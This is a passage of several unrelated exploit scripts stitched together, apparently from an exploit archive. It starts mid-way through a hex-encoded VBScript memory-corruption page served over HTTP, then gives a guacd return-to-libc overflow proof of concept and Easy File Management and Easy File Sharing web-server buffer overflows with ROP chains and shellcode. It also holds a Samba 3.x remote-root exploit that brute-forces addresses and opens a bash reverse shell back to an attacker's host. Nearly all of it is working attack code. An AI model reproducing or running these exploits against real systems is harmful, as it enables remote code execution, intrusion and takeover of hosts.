           "\x29\x3d\x36\x2e\x33\x36\x35\x39\x38\x37\x33\x37\x34\x33\x37\x38\x30\x31\x45\x2d\x33\x31\x34\x0d"
           "\x0a\x20\x0d\x0a\x20\x20\x20\x20\x20\x61\x61\x28\x61\x31\x2b\x32\x29\x3d\x6d\x79\x61\x72\x72\x61"
           "\x79\x0d\x0a\x20\x20\x20\x20\x20\x61\x62\x28\x32\x29\x3d\x31\x2e\x37\x34\x30\x38\x38\x35\x33\x34"
           "\x37\x33\x31\x33\x32\x34\x45\x2d\x33\x31\x30\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x6d\x79\x64\x61"
           "\x74\x61\x3d\x61\x61\x28\x61\x31\x29\x0d\x0a\x20\x20\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x50"
           "\x72\x65\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x30\x29\x20\x20\x0d\x0a\x65\x6e\x64\x20\x66\x75"
           "\x6e\x63\x74\x69\x6f\x6e\x20\x0d\x0a\x20\x0d\x0a\x20\x0d\x0a\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20"
           "\x73\x65\x74\x6e\x6f\x74\x73\x61\x66\x65\x6d\x6f\x64\x65\x28\x29\x0d\x0a\x20\x20\x20\x20\x4f\x6e"
           "\x20\x45\x72\x72\x6f\x72\x20\x52\x65\x73\x75\x6d\x65\x20\x4e\x65\x78\x74\x0d\x0a\x20\x20\x20\x20"
           "\x69\x3d\x6d\x79\x64\x61\x74\x61\x28\x29\x20\x20\x0d\x0a\x20\x20\x20\x20\x69\x3d\x72\x75\x6d\x28"
           "\x69\x2b\x38\x29\x0d\x0a\x20\x20\x20\x20\x69\x3d\x72\x75\x6d\x28\x69\x2b\x31\x36\x29\x0d\x0a\x20"
           "\x20\x20\x20\x6a\x3d\x72\x75\x6d\x28\x69\x2b\x26\x68\x31\x33\x34\x29\x20\x20\x0d\x0a\x20\x20\x20"
           "\x20\x66\x6f\x72\x20\x6b\x3d\x30\x20\x74\x6f\x20\x26\x68\x36\x30\x20\x73\x74\x65\x70\x20\x34\x0d"
           "\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6a\x3d\x72\x75\x6d\x28\x69\x2b\x26\x68\x31\x32\x30\x2b\x6b"
           "\x29\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x28\x6a\x3d\x31\x34\x29\x20\x74\x68\x65\x6e"
           "\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6a\x3d\x30\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x64"
           "\x69\x6d\x20\x20\x50\x72\x65\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x32\x29\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x61\x61\x28\x61\x31\x2b\x32\x29\x28"
           "\x69\x2b\x26\x68\x31\x31\x63\x2b\x6b\x29\x3d\x61\x62\x28\x34\x29\x0d\x0a\x20\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x50\x72\x65\x73\x65\x72\x76\x65\x20"
           "\x61\x61\x28\x61\x30\x29\x20\x20\x0d\x0a\x20\x0d\x0a\x20\x20\x20\x20\x20\x6a\x3d\x30\x20\x0d\x0a"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6a\x3d\x72\x75\x6d\x28\x69\x2b\x26\x68"
           "\x31\x32\x30\x2b\x6b\x29\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x45\x78\x69\x74\x20\x66\x6f\x72\x0d\x0a"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6e\x64\x20\x69\x66\x0d\x0a\x20\x0d\x0a\x20\x20"
           "\x20\x20\x6e\x65\x78\x74\x20\x0d\x0a\x20\x20\x20\x20\x61\x62\x28\x32\x29\x3d\x31\x2e\x36\x39\x37"
           "\x35\x39\x36\x36\x33\x33\x31\x36\x37\x34\x37\x45\x2d\x33\x31\x33\x0d\x0a\x20\x20\x20\x20\x72\x75"
           "\x6e\x6d\x75\x6d\x61\x61\x28\x29\x20\x0d\x0a\x65\x6e\x64\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d"
           "\x0a\x20\x0d\x0a\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x4f\x76\x65\x72\x28\x29\x0d\x0a\x20\x20\x20"
           "\x20\x4f\x6e\x20\x45\x72\x72\x6f\x72\x20\x52\x65\x73\x75\x6d\x65\x20\x4e\x65\x78\x74\x0d\x0a\x20"
           "\x20\x20\x20\x64\x69\x6d\x20\x74\x79\x70\x65\x31\x2c\x74\x79\x70\x65\x32\x2c\x74\x79\x70\x65\x33"
           "\x0d\x0a\x20\x20\x20\x20\x4f\x76\x65\x72\x3d\x46\x61\x6c\x73\x65\x0d\x0a\x20\x20\x20\x20\x61\x30"
           "\x3d\x61\x30\x2b\x61\x33\x0d\x0a\x20\x20\x20\x20\x61\x31\x3d\x61\x30\x2b\x32\x0d\x0a\x20\x20\x20"
           "\x20\x61\x32\x3d\x61\x30\x2b\x26\x68\x38\x30\x30\x30\x30\x30\x30\x0d\x0a\x20\x20\x20\x0d\x0a\x20"
           "\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x50\x72\x65\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x30"
           "\x29\x20\x0d\x0a\x20\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x20\x61\x62\x28\x61\x30\x29\x20\x20"
           "\x20\x20\x20\x0d\x0a\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x50\x72\x65"
           "\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x32\x29\x0d\x0a\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x74"
           "\x79\x70\x65\x31\x3d\x31\x0d\x0a\x20\x20\x20\x20\x61\x62\x28\x30\x29\x3d\x31\x2e\x31\x32\x33\x34"
           "\x35\x36\x37\x38\x39\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x30\x31\x32\x33\x34\x35\x36\x37\x38"
           "\x39\x30\x0d\x0a\x20\x20\x20\x20\x61\x61\x28\x61\x30\x29\x3d\x31\x30\x0d\x0a\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x49\x66\x28\x49\x73\x4f\x62\x6a\x65\x63\x74\x28"
           "\x61\x61\x28\x61\x31\x2d\x31\x29\x29\x20\x3d\x20\x46\x61\x6c\x73\x65\x29\x20\x54\x68\x65\x6e\x0d"
           "\x0a\x20\x20\x20\x20\x20\x20\x20\x69\x66\x28\x69\x6e\x74\x56\x65\x72\x73\x69\x6f\x6e\x3c\x34\x29"
           "\x20\x74\x68\x65\x6e\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6d\x65\x6d\x3d\x63\x69"
           "\x6e\x74\x28\x61\x30\x2b\x31\x29\x2a\x31\x36\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6a\x3d\x76\x61\x72\x74\x79\x70\x65\x28\x61"
           "\x61\x28\x61\x31\x2d\x31\x29\x29\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x28"
           "\x28\x6a\x3d\x6d\x65\x6d\x2b\x34\x29\x20\x6f\x72\x20\x28\x6a\x2a\x38\x3d\x6d\x65\x6d\x2b\x38\x29"
           "\x29\x20\x74\x68\x65\x6e\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66"
           "\x28\x76\x61\x72\x74\x79\x70\x65\x28\x61\x61\x28\x61\x31\x2d\x31\x29\x29\x3c\x3e\x30\x29\x20\x20"
           "\x54\x68\x65\x6e\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x49\x66\x28\x49\x73\x4f\x62\x6a\x65\x63\x74\x28\x61\x61\x28\x61\x31\x29\x29\x20\x3d"
           "\x20\x46\x61\x6c\x73\x65\x20\x29\x20\x54\x68\x65\x6e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x74"
           "\x79\x70\x65\x31\x3d\x56\x61\x72\x54\x79\x70\x65\x28\x61\x61\x28\x61\x31\x29\x29\x0d\x0a\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6e\x64\x20\x69\x66\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x65\x6e\x64\x20\x69\x66\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65"
           "\x6c\x73\x65\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x72\x65\x64\x69\x6d\x20"
           "\x20\x50\x72\x65\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x30\x29\x0d\x0a\x20\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x65\x78\x69\x74\x20\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d\x0a\x20"
           "\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6e\x64\x20\x69\x66\x20\x0d\x0a\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x65\x6c\x73\x65\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69"
           "\x66\x28\x76\x61\x72\x74\x79\x70\x65\x28\x61\x61\x28\x61\x31\x2d\x31\x29\x29\x3c\x3e\x30\x29\x20"
           "\x20\x54\x68\x65\x6e\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x20\x49\x66\x28\x49\x73\x4f\x62\x6a\x65\x63\x74\x28\x61\x61\x28\x61\x31\x29\x29\x20\x3d\x20\x46"
           "\x61\x6c\x73\x65\x20\x29\x20\x54\x68\x65\x6e\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x74\x79\x70\x65\x31\x3d\x56\x61\x72\x54\x79\x70\x65\x28\x61\x61\x28"
           "\x61\x31\x29\x29\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6e\x64\x20"
           "\x69\x66\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x65\x6e\x64\x20\x69\x66\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x65"
           "\x6e\x64\x20\x69\x66\x0d\x0a\x20\x20\x20\x20\x65\x6e\x64\x20\x69\x66\x0d\x0a\x20\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x49"
           "\x66\x28\x74\x79\x70\x65\x31\x3d\x26\x68\x32\x66\x36\x36\x29\x20\x54\x68\x65\x6e\x20\x20\x20\x20"
           "\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4f\x76\x65\x72\x3d\x54\x72"
           "\x75\x65\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x45\x6e\x64\x20\x49\x66\x20\x20\x0d\x0a"
           "\x20\x20\x20\x20\x49\x66\x28\x74\x79\x70\x65\x31\x3d\x26\x68\x42\x39\x41\x44\x29\x20\x54\x68\x65"
           "\x6e\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x4f\x76\x65\x72\x3d\x54\x72\x75\x65\x0d\x0a"
           "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x77\x69\x6e\x39\x78\x3d\x31\x0d\x0a\x20\x20\x20\x20\x45"
           "\x6e\x64\x20\x49\x66\x20\x20\x0d\x0a\x20\x0d\x0a\x20\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x50"
           "\x72\x65\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x30\x29\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
           "\x0d\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x65\x6e\x64\x20\x66\x75\x6e\x63\x74\x69\x6f"
           "\x6e\x0d\x0a\x20\x0d\x0a\x66\x75\x6e\x63\x74\x69\x6f\x6e\x20\x72\x75\x6d\x28\x61\x64\x64\x29\x20"
           "\x0d\x0a\x20\x20\x20\x20\x4f\x6e\x20\x45\x72\x72\x6f\x72\x20\x52\x65\x73\x75\x6d\x65\x20\x4e\x65"
           "\x78\x74\x0d\x0a\x20\x20\x20\x20\x72\x65\x64\x69\x6d\x20\x20\x50\x72\x65\x73\x65\x72\x76\x65\x20"
           "\x61\x61\x28\x61\x32\x29\x20\x20\x0d\x0a\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x61\x62\x28\x30\x29"
           "\x3d\x30\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x61\x61\x28\x61\x31\x29\x3d\x61\x64\x64\x2b\x34\x20"
           "\x20\x20\x20\x20\x0d\x0a\x20\x20\x20\x20\x61\x62\x28\x30\x29\x3d\x31\x2e\x36\x39\x37\x35\x39\x36"
           "\x36\x33\x33\x31\x36\x37\x34\x37\x45\x2d\x33\x31\x33\x20\x20\x20\x20\x20\x20\x20\x0d\x0a\x20\x20"
           "\x20\x20\x72\x75\x6d\x3d\x6c\x65\x6e\x62\x28\x61\x61\x28\x61\x31\x29\x29\x20\x20\x0d\x0a\x20\x20"
           "\x20\x20\x0d\x0a\x20\x20\x20\x20\x61\x62\x28\x30\x29\x3d\x30\x0d\x0a\x20\x20\x20\x20\x72\x65\x64"
           "\x69\x6d\x20\x20\x50\x72\x65\x73\x65\x72\x76\x65\x20\x61\x61\x28\x61\x30\x29\x0d\x0a\x65\x6e\x64"
           "\x20\x66\x75\x6e\x63\x74\x69\x6f\x6e\x0d\x0a\x20\x0d\x0a\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e\x0d"
           "\x0a\x20\x0d\x0a\x3c\x2f\x62\x6f\x64\x79\x3e\x0d\x0a\x3c\x2f\x68\x74\x6d\x6c\x3e")
    hesam="HTTP/1.1 200 OK\n"+"Content-Type: text/html\n"+"\n"+hesam
    http_response = hesam.replace("FILE_DOWNLOAD","http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe")#exe link
    client_connection.sendall(http_response)
    client_connection.close()source: http://www.securityfocus.com/bid/55497/info

libguac is prone to a remote buffer-overflow vulnerability.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in denial-of-service conditions. 

#!/usr/bin/python
# CVE-2012-4415: PoC for guacd buffer overflow vulnerability # # Copyright (c) 2012 Timo Juhani Lindfors <timo.lindfors@iki.fi> # # Allows arbitrary code execution on Debian i386 guacd 0.6.0-1 with # default configuration. Uses return-to-libc to bypass non-executable # stack.
#
import socket, struct
PROTOCOL_ADDRESS = 0xbf807e9f
SYSTEM_ADDRESS = 0xb76e7640
class GuacdPOC:
    def __init__(self, command):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect(('localhost', 4822))
        self.s("select")
        self.c(",")
        protocol = (command + "; " + "#" * 265)[:265]
        protocol += struct.pack("L", PROTOCOL_ADDRESS)
        protocol += struct.pack("L", SYSTEM_ADDRESS)
        self.s(protocol)
        self.c(";")
    def s(self, x):
        self.sock.send("%d.%s" % (len(x), x))
    def c(self, x):
        self.sock.send(x)
GuacdPOC("touch /tmp/owned")

#!/usr/bin/python
# Exploit Title: Easy File Management Web Server v5.6 - USERID Remote Buffer Overflow 
# Version:       5.6
# Date:          2015-08-17
# Author:        Tracy Turben (tracyturben@gmail.com)
# Software Link: http://www.efssoft.com/
# Tested on:     Win7x32-EN
# Special Thanks To: Julien Ahrens for the crafted jmp esp Trick ;) 
# Credits for vulnerability discovery:
# superkojiman (http://www.exploit-db.com/exploits/33453/)


from struct import pack
import socket,sys
import os
  
host="192.168.1.15"
port=80
  
junk0 = "\x90" * 80
 

# 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll] 
# The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
# Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
call_edx=pack('<L',0x1001D8C8) 
 
junk1="\x90" * 280
ppr=pack('<L',0x10010101) # POP EBX # POP ECX # RETN [ImageLoad.dll]
 
# Since 0x00 would break the exploit needs to be crafted on the stack
crafted_jmp_esp=pack('<L',0xA44162FB)
 
test_bl=pack('<L',0x10010125) # contains 00000000 to pass the JNZ instruction
 
kungfu=pack('<L',0x10022aac)  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0x1001a187) # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
kungfu+=pack('<L',0x1002466d) # PUSH EAX # RETN [ImageLoad.dll]
 
nopsled="\x90" * 20
 
# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# powered by Metasploit 
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'
 
shellcode=("\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab" +
"\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71" +
"\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09" +
"\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c" +
"\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e" +
"\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78" +
"\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22" +
"\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f" +
"\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28" +
"\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50" +
"\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4" +
"\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56" +
"\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56" +
"\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16" +
"\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea" +
"\xa5\x59\x50")
 
payload=junk0 + call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + shellcode
 
buf="GET /vfolder.ghp HTTP/1.1\r\n"
buf+="User-Agent: Mozilla/4.0\r\n"
buf+="Host:" + host + ":" + str(port) + "\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf+="Accept-Language: en-us\r\n"
buf+="Accept-Encoding: gzip, deflate\r\n"
buf+="Referer: http://" + host + "/\r\n"
buf+="Cookie: SESSIONID=1337; UserID=" + payload + "; PassWD=;\r\n"
buf+="Conection: Keep-Alive\r\n\r\n"
  
print "[*] Connecting to Host " + host + "..."
 
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)
     
print "[*] Sending malformed request..."
s.send(buf)
 
print "[!] Exploit has been sent!\n"
s.close()
source: http://www.securityfocus.com/bid/55655/info

Samba is prone to an unspecified remote code-execution vulnerability.

An attacker can exploit this issue to execute arbitrary code with root privileges. Failed exploit attempts will cause a denial-of-service condition. 

#!/usr/bin/python
#
# finding targets 4 31337z:
# gdb /usr/sbin/smbd `ps auwx | grep smbd | grep -v grep | head -n1 | awk '{ print $2 }'` <<< `echo -e "print system"` | grep '$1'
#    -> to get system_libc_addr, enter this value in the 'system_libc_offset' value of the target_finder, run, sit back, wait for shell
# found by eax samba 0day godz (loljk)


from binascii import hexlify, unhexlify
import socket
import threading
import SocketServer
import sys
import os
import time
import struct      

targets = [
	{
		"name"               : "samba_3.6.3-debian6",
		"chunk_offset"       : 0x9148,
		"system_libc_offset" : 0xb6d003c0
	},
	{
		"name"               : "samba_3.5.11~dfsg-1ubuntu2.1_i386 (oneiric)",
		"chunk_offset"       : 4560, 
		"system_libc_offset" : 0xb20
	},
	{
		"name"               : "target_finder (hardcode correct system addr)", 
		"chunk_offset"       : 0, 
		"system_libc_offset" : 0xb6d1a3c0, 
		"finder": True
	}
]

do_brute = True
rs = 1024
FILTER=''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])

def dump(src, length=32):
	result=[]
	for i in xrange(0, len(src), length):
		s = src[i:i+length]
		hexa = ' '.join(["%02x"%ord(x) for x in s])
		printable = s.translate(FILTER)
		result.append("%04x   %-*s   %s\n" % (i, length*3, hexa, printable))
	return ''.join(result)


sploitshake = [
	# HELLO
	"8100004420434b4644454e4543464445" + \
	"46464346474546464343414341434143" + \
	"41434143410020454745424644464545" + \
	"43455046494341434143414341434143" + \
	"4143414341414100",

	# NTLM_NEGOT
	"0000002fff534d427200000000000000" + \
	"00000000000000000000000000001d14" + \
	"00000000000c00024e54204c4d20302e" + \
	"313200",

	# SESSION_SETUP
	"0000004bff534d427300000000080000" + \
	"000000000000000000000000ffff1d14" + \
	"000000000dff000000ffff02001d1499" + \
	"1f00000000000000000000010000000e" + \
	"000000706f736978007079736d6200",

	# TREE_CONNECT
	"00000044ff534d427500000000080000" + \
	"000000000000000000000000ffff1d14" + \
	"6400000004ff00000000000100190000" + \
	"5c5c2a534d425345525645525c495043" + \
	"24003f3f3f3f3f00",

	# NT_CREATE
	"00000059ff534d42a200000000180100" + \
	"00000000000000000000000001001d14" + \
	"6400000018ff00000000050016000000" + \
	"000000009f0102000000000000000000" + \
	"00000000030000000100000040000000" + \
	"020000000306005c73616d7200"
]

pwnsauce = {
	'smb_bind': \
		"00000092ff534d422500000000000100" + \
		"00000000000000000000000001001d14" + \
		"6400000010000048000004e0ff000000" + \
		"0000000000000000004a0048004a0002" + \
		"002600babe4f005c504950455c000500" + \
		"0b03100000004800000001000000b810" + \
		"b8100000000001000000000001007857" + \
		"34123412cdabef000123456789ab0000" + \
		"0000045d888aeb1cc9119fe808002b10" + \
		"486002000000",

	'data_chunk': \
		"000010efff534d422f00000000180000" + \
		"00000000000000000000000001001d14" + \
		"640000000eff000000babe00000000ff" + \
		"0000000800b0100000b0103f00000000" + \
		"00b0100500000110000000b010000001" + \
		"0000009810000000000800",

	'final_chunk': \
		"000009a3ff534d422f00000000180000" + \
		"00000000000000000000000001001d14" + \
		"640000000eff000000babe00000000ff" + \
		"00000008006409000064093f00000000" + \
		"00640905000002100000006409000001" + \
		"0000004c09000000000800"
}


def exploit(host, port, cbhost, cbport, target):
	global sploitshake, pwnsauce

	chunk_size = 4248

	target_tcp = (host, port)

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(target_tcp)

	n = 0
	for pkt in sploitshake:
		s.send(unhexlify(pkt))
		pkt_res = s.recv(rs)
		n = n+1

	fid = hexlify(pkt_res[0x2a] + pkt_res[0x2b])

	s.send(unhexlify(pwnsauce['smb_bind'].replace("babe", fid)))
	pkt_res = s.recv(rs)

	buf = "X"*20  # policy handle
	level = 2 #LSA_POLICY_INFO_AUDIT_EVENTS
	buf+=struct.pack('<H',level) # level
	buf+=struct.pack('<H',level)# level2
	buf+=struct.pack('<L',1)#auditing_mode
	buf+=struct.pack('<L',1)#ptr
	buf+=struct.pack('<L',100000) # r->count
	buf+=struct.pack('<L',20) # array_size
	buf+=struct.pack('<L',0)
	buf+=struct.pack('<L',100)

	buf += ("A" * target['chunk_offset'])

	buf+=struct.pack("I", 0);
	buf+=struct.pack("I", target['system_libc_offset']);
	buf+=struct.pack("I", 0);
	buf+=struct.pack("I", target['system_libc_offset']);
	buf+=struct.pack("I", 0xe8150c70);
	buf+="AAAABBBB"

	cmd = ";;;;/bin/bash -c '/bin/bash 0</dev/tcp/"+cbhost+"/"+cbport+" 1>&0 2>&0' &\x00"

	tmp = cmd*(816/len(cmd))
	tmp += "\x00"*(816-len(tmp))

	buf+=tmp
	buf+="A"*(37192-target['chunk_offset'])
	buf+='z'*(100000 - (28000 + 10000))

	buf_chunks = [buf[x:x+chunk_size] for x in xrange(0, len(buf), chunk_size)]
	n=0

	for chunk in buf_chunks:
		if len(chunk) != chunk_size:
			#print "LAST CHUNK #%d" % n
			bb = unhexlify(pwnsauce['final_chunk'].replace("babe", fid)) + chunk
			s.send(bb)
		else:
			#print "CHUNK #%d" % n
			bb = unhexlify(pwnsauce['data_chunk'].replace("babe", fid)) + chunk
			s.send(bb)
			retbuf = s.recv(rs)
		n=n+1

	s.close()

class connectback_shell(SocketServer.BaseRequestHandler):
	def handle(self):
		global do_brute

		print "\n[!] connectback shell from %s" % self.client_address[0]
		do_brute = False

		s = self.request

		import termios, tty, select, os
		old_settings = termios.tcgetattr(0)
		try:
			tty.setcbreak(0)
			c = True
			while c:
				for i in select.select([0, s.fileno()], [], [], 0)[0]:
					c = os.read(i, 1024)
					if c:
						if i == 0:
							os.write(1, c)

						os.write(s.fileno() if i == 0 else 1, c)
		except KeyboardInterrupt: pass
		finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)

		return
		

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
	pass


if len(sys.argv) != 6:
	print "\n  {*} samba 3.x remote root by kd(eax)@ireleaseyourohdayfuckyou {*}\n"
	print "  usage: %s <targethost> <targetport> <myip> <myport> <target>\n" % (sys.argv[0])
	print "  targets:"
	i = 0
	for target in targets:
		print "    %02d) %s" % (i, target['name'])
		i = i+1

	print ""
	sys.exit(-1)


target = targets[int(sys.argv[5])]

server = ThreadedTCPServer((sys.argv[3], int(sys.argv[4])), connectback_shell)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()

while do_brute == True:
	sys.stdout.write("\r{+} TRYING EIP=\x1b[31m0x%08x\x1b[0m OFFSET=\x1b[32m0x%08x\x1b[0m" % (target['system_libc_offset'], target['chunk_offset']))
	sys.stdout.flush()
	exploit(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], target)

	if "finder" in target:
		target['chunk_offset'] += 4
	else:
		target['system_libc_offset'] += 0x1000


if "finder" in target:
	print \
		"{!} found \x1b[32mNEW\x1b[0m target: chunk_offset = ~%d, " \
		"system_libc_offset = 0x%03x" % \
		(target['chunk_offset'], target['system_libc_offset'] & 0xff000fff)

while 1:
	time.sleep(999)

server.shutdown()
#!/usr/bin/python
# Exploit Title: Easy File Sharing Web Server v6.9 - USERID Remote Buffer Overflow 
# Version:       6.9
# Date:          2015-08-22
# Author:        Tracy Turben (tracyturben@gmail.com)
# Software Link: http://www.efssoft.com/
# Tested on:     Win7x32-EN,Win7x64-EN
# Special Thanks To: Julien Ahrens for the crafted jmp esp Trick ;) 
# Credits for vulnerability discovery:
# superkojiman (http://www.exploit-db.com/exploits/33453/)


from struct import pack
import socket,sys
import os
  
host="192.168.1.15"
port=80
  
junk0 = "\x90" * 80
 

# 0x1001d89b : {pivot 604 / 0x25c} # POP EDI # POP ESI # POP EBP # POP EBX # ADD ESP,24C # RETN [ImageLoad.dll] 
# The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
# Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
call_edx=pack('<L',0x1001D8C8) 
 
junk1="\x90" * 396
ppr=pack('<L',0x10010101) # POP EBX # POP ECX # RETN [ImageLoad.dll]
 
# Since 0x00 would break the exploit 00520498 PUSH ESP needs to be crafted on the stack.
crafted_jmp_esp=pack('<L',0xA4523C15)


test_bl=pack('<L',0x10010125) # contains 00000000 to pass the JNZ instruction
 
kungfu=pack('<L',0x10022aac)  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
